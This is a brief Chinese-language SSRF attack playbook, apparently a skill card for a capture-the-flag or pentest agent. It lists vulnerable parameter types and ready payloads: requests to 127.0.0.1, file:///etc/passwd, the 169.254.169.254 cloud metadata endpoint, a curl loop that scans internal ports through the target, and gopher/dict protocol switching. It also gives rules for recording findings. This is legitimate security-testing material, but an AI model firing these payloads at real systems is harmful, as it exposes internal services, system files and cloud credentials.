# ssrf 服务端请求伪造

适用：url/fetch/source/link/img 参数、导入功能、webhook、在线预览。

打法：
- 先探内网：?url=http://127.0.0.1:PORT/、http://localhost/admin、file:///etc/passwd。
- 云元数据：http://169.254.169.254/latest/meta-data/（有 flag 也常藏在元数据）。
- 内网端口批量：for p in 80 8080 5000 6379 3306 22; do curl -m 4 "http://HOST/?url=http://127.0.0.1:$p"; echo; done  按响应差异判存活。
- 协议切换：file://、gopher://、dict://。

判定：内网响应回显/元数据返回 → fact(kind=ssrf)；读到内网 flag → finding。

停止：内外网响应完全一致（无差异字节），标 dead。
